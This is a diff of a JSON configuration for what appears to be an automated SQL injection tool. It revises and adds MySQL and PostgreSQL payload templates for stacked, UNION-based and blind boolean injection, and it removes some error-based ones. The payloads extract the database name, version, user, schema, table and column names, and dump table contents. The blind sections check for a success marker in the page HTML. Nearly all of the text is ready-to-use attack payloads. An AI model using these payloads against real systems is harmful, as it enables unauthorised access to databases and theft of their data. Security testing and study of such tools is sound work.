@@ -66,41 +66,71 @@
 					"sys"
 				],
 				"stacked": {
-					"database": "'; SELECT CONCAT({delimiter}, DATABASE(), {delimiter})-- -",
-					"version": "'; SELECT CONCAT({delimiter}, VERSION(), {delimiter})-- -",
-					"user": "'; SELECT CONCAT({delimiter}, USER(), {delimiter})-- -",
-					"databases": "'; SELECT CONCAT({delimiter}, schema_name, {delimiter}) FROM information_schema.schemata-- -",
-					"tables": "'; SELECT CONCAT({delimiter}, table_name, {delimiter}) FROM information_schema.tables WHERE table_schema={database}-- -",
-					"columns": "'; SELECT CONCAT({delimiter}, column_name, {delimiter}) FROM information_schema.columns WHERE table_schema={database} AND table_name={table}-- -",
-					"dump": "'; SELECT CONCAT({delimiter}, {column}, {delimiter}) FROM {database}.{table}-- -"
+					"database": "' AND 0; SELECT CONCAT('{delimiter}', DATABASE(), '{delimiter}') as name-- -",
+					"version": "' AND 0; SELECT CONCAT('{delimiter}', VERSION(), '{delimiter}') as name-- -",
+					"user": "' AND 0; SELECT CONCAT('{delimiter}', USER(), '{delimiter}') as name-- -",
+					"databases": "' AND 0; SELECT CONCAT('{delimiter}', schema_name, '{delimiter}') as name FROM information_schema.schemata-- -",
+					"tables": "' AND 0; SELECT CONCAT('{delimiter}', table_name, '{delimiter}') as name FROM information_schema.tables WHERE table_schema='{database}'-- -",
+					"columns": "' AND 0; SELECT CONCAT('{delimiter}', column_name, '{delimiter}') as name FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}'-- -",
+					"dump": "' AND 0; SELECT CONCAT('{delimiter}', {column}, '{delimiter}') as name FROM `{database}`.`{table}`-- -"
 				},
 				"union": {
 					"min_offset": 0,
 					"max_offset": 15,
-					"database": "+' UNION SELECT {offset_bef} CONCAT({delimiter}, DATABASE(), {delimiter}) {offset_aft}-- -",
-					"version": "+' UNION SELECT {offset_bef} CONCAT({delimiter}, VERSION(), {delimiter}) {offset_aft}-- -",
-					"user": "+' UNION SELECT {offset_bef} CONCAT({delimiter}, USER(), {delimiter}) {offset_aft}-- -",
-					"databases": "+' UNION SELECT {offset_bef} CONCAT({delimiter}, schema_name, {delimiter}) {offset_aft} FROM information_schema.schemata LIMIT {limit} OFFSET {offset}-- -",
-					"tables": "+' UNION SELECT {offset_bef} CONCAT({delimiter}, table_name, {delimiter}) {offset_aft} FROM information_schema.tables WHERE table_schema='{database}' LIMIT {limit} OFFSET {offset}-- -",
-					"columns": "+' UNION SELECT {offset_bef} CONCAT({delimiter}, column_name, {delimiter}) {offset_aft} FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}' LIMIT {limit} OFFSET {offset}-- -",
-					"dump": "+' UNION SELECT {offset_bef} CONCAT({delimiter}, {column}, {delimiter}) {offset_aft} FROM {database}.{table} LIMIT {limit} OFFSET {offset}-- -"
-				},
-				"error_based": {
-					"database": "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT({delimiter}, (SELECT DATABASE()), {delimiter}, FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x) AS y)-- +",
-					"version": "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT({delimiter}, (SELECT VERSION()), {delimiter}, FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x) AS y)-- +",
-					"user": "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT({delimiter}, (SELECT USER()), {delimiter}, FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x) AS y)-- +",
-					"databases": "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT({delimiter}, (SELECT schema_name FROM information_schema.schemata LIMIT {offset},1), {delimiter}, FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x) AS y)-- +",
-					"tables": "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT({delimiter}, (SELECT table_name FROM information_schema.tables WHERE table_schema={database} LIMIT {offset},1), {delimiter}, FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x) AS y)-- +",
-					"columns": "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT({delimiter}, (SELECT column_name FROM information_schema.columns WHERE table_schema={database} AND table_name={table} LIMIT {offset},1), {delimiter}, FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x) AS y)-- +"
+					"database": "+' UNION SELECT {offset_bef} CONCAT('{delimiter}', DATABASE(), '{delimiter}') {offset_aft}-- -",
+					"version": "+' UNION SELECT {offset_bef} CONCAT('{delimiter}', VERSION(), '{delimiter}') {offset_aft}-- -",
+					"user": "+' UNION SELECT {offset_bef} CONCAT('{delimiter}', USER(), '{delimiter}') {offset_aft}-- -",
+					"databases": "+' UNION SELECT {offset_bef} CONCAT('{delimiter}', schema_name, '{delimiter}') {offset_aft} FROM information_schema.schemata LIMIT {limit} OFFSET {offset}-- -",
+					"tables": "+' UNION SELECT {offset_bef} CONCAT('{delimiter}', table_name, '{delimiter}') {offset_aft} FROM information_schema.tables WHERE table_schema='{database}' LIMIT {limit} OFFSET {offset}-- -",
+					"columns": "+' UNION SELECT {offset_bef} CONCAT('{delimiter}', column_name, '{delimiter}') {offset_aft} FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}' LIMIT {limit} OFFSET {offset}-- -",
+					"dump": "+' UNION SELECT {offset_bef} CONCAT('{delimiter}', {column}, '{delimiter}') {offset_aft} FROM `{database}`.`{table}` LIMIT {limit} OFFSET {offset}-- -"
 				},
 				"blind": {
-					"database": "' OR IF(SUBSTRING((SELECT CONCAT({delimiter}, DATABASE(), {delimiter})),{position},1)='{char}',1,0)-- -",
-					"version": "' OR IF(SUBSTRING((SELECT CONCAT({delimiter}, VERSION(), {delimiter})),{position},1)='{char}',1,0)-- -",
-					"user": "' OR IF(SUBSTRING((SELECT CONCAT({delimiter}, USER(), {delimiter})),{position},1)='{char}',1,0)-- -",
-					"databases": "' OR IF(SUBSTRING((SELECT CONCAT({delimiter}, schema_name, {delimiter}) FROM information_schema.schemata LIMIT 1 OFFSET {offset}),{position},1)='{char}',1,0)-- -",
-					"tables": "' OR IF(SUBSTRING((SELECT CONCAT({delimiter}, table_name, {delimiter}) FROM information_schema.tables WHERE table_schema={database} LIMIT 1 OFFSET {offset}),{position},1)='{char}',1,0)-- -",
-					"columns": "' OR IF(SUBSTRING((SELECT CONCAT({delimiter}, column_name, {delimiter}) FROM information_schema.columns WHERE table_schema={database} AND table_name={table} LIMIT 1 OFFSET {offset}),{position},1)='{char}',1,0)-- -",
-					"dump": "' OR IF(SUBSTRING((SELECT CONCAT({delimiter}, {column}, {delimiter}) FROM {database}.{table} LIMIT 1 OFFSET {row_offset}),{position},1)='{char}',1,0)-- -"
+					"success_substring": "<div class=\"product-name\">",
+					"database": "' AND IF(SUBSTRING((SELECT DATABASE()),{position},1)='{char}',1,0)-- -",
+					"version": "' AND IF(SUBSTRING((SELECT VERSION()),{position},1)='{char}',1,0)-- -",
+					"user": "' AND IF(SUBSTRING((SELECT USER()),{position},1)='{char}',1,0)-- -",
+					"databases": "' AND IF(SUBSTRING((SELECT schema_name FROM information_schema.schemata LIMIT 1 OFFSET {offset}),{position},1)='{char}',1,0)-- -",
+					"tables": "' AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='{database}' LIMIT 1 OFFSET {offset}),{position},1)='{char}',1,0)-- -",
+					"columns": "' AND IF(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}' LIMIT 1 OFFSET {offset}),{position},1)='{char}',1,0)-- -",
+					"dump": "' AND IF(SUBSTRING((SELECT {column} FROM `{database}`.`{table}` LIMIT 1 OFFSET {offset}),{position},1)='{char}',1,0)-- -"
+				}
+			},
+			"postgresql": {
+				"ignored_databases": [
+					"information_schema",
+					"pg_catalog",
+					"pg_toast"
+				],
+				"stacked": {
+					"database": "' AND FALSE; SELECT CONCAT('{delimiter}', current_database(), '{delimiter}') as name-- -",
+					"version": "' AND FALSE; SELECT CONCAT('{delimiter}', version(), '{delimiter}') as name-- -",
+					"user": "' AND FALSE; SELECT CONCAT('{delimiter}', current_user, '{delimiter}') as name-- -",
+					"databases": "' AND FALSE; SELECT CONCAT('{delimiter}', schema_name, '{delimiter}') as name FROM information_schema.schemata-- -",
+					"tables": "' AND FALSE; SELECT CONCAT('{delimiter}', table_name, '{delimiter}') as name FROM information_schema.tables WHERE table_schema='{database}'-- -",
+					"columns": "' AND FALSE; SELECT CONCAT('{delimiter}', column_name, '{delimiter}') as name FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}'-- -",
+					"dump": "' AND FALSE; SELECT CONCAT('{delimiter}', {column}, '{delimiter}') as name FROM \"{database}\".\"{table}\"-- -"
+				},
+				"union": {
+					"min_offset": 0,
+					"max_offset": 15,
+					"database": "+' UNION SELECT {offset_bef} CONCAT('{delimiter}', current_database(), '{delimiter}') {offset_aft}-- -",
+					"version": "+' UNION SELECT {offset_bef} CONCAT('{delimiter}', version(), '{delimiter}') {offset_aft}-- -",
+					"user": "+' UNION SELECT {offset_bef} CONCAT('{delimiter}', current_user, '{delimiter}') {offset_aft}-- -",
+					"databases": "+' UNION SELECT {offset_bef} CONCAT('{delimiter}', schema_name, '{delimiter}') {offset_aft} FROM information_schema.schemata LIMIT {limit} OFFSET {offset}-- -",
+					"tables": "+' UNION SELECT {offset_bef} CONCAT('{delimiter}', table_name, '{delimiter}') {offset_aft} FROM information_schema.tables WHERE table_schema='{database}' LIMIT {limit} OFFSET {offset}-- -",
+					"columns": "+' UNION SELECT {offset_bef} CONCAT('{delimiter}', column_name, '{delimiter}') {offset_aft} FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}' LIMIT {limit} OFFSET {offset}-- -",
+					"dump": "+' UNION SELECT {offset_bef} CONCAT('{delimiter}', {column}, '{delimiter}') {offset_aft} FROM \"{database}\".\"{table}\" LIMIT {limit} OFFSET {offset}-- -"
+				},
+				"blind": {
+					"success_substring": "<div class=\"product-name\">",
+					"database": "' AND CASE WHEN SUBSTRING((SELECT current_database()),{position},1)='{char}' THEN TRUE ELSE FALSE END-- -",
+					"version": "' AND CASE WHEN SUBSTRING((SELECT version()),{position},1)='{char}' THEN TRUE ELSE FALSE END-- -",
+					"user": "' AND CASE WHEN SUBSTRING((SELECT current_user),{position},1)='{char}' THEN TRUE ELSE FALSE END-- -",
+					"databases": "' AND CASE WHEN SUBSTRING((SELECT schema_name FROM information_schema.schemata LIMIT 1 OFFSET {offset}),{position},1)='{char}' THEN TRUE ELSE FALSE END-- -",
+					"tables": "' AND CASE WHEN SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='{database}' LIMIT 1 OFFSET {offset}),{position},1)='{char}' THEN TRUE ELSE FALSE END-- -",
+					"columns": "' AND CASE WHEN SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}' LIMIT 1 OFFSET {offset}),{position},1)='{char}' THEN TRUE ELSE FALSE END-- -",
+					"dump": "' AND CASE WHEN SUBSTRING((SELECT {column} FROM \"{database}\".\"{table}\" LIMIT 1 OFFSET {offset}),{position},1)='{char}' THEN TRUE ELSE FALSE END-- -"
 				}
 			}
 		}
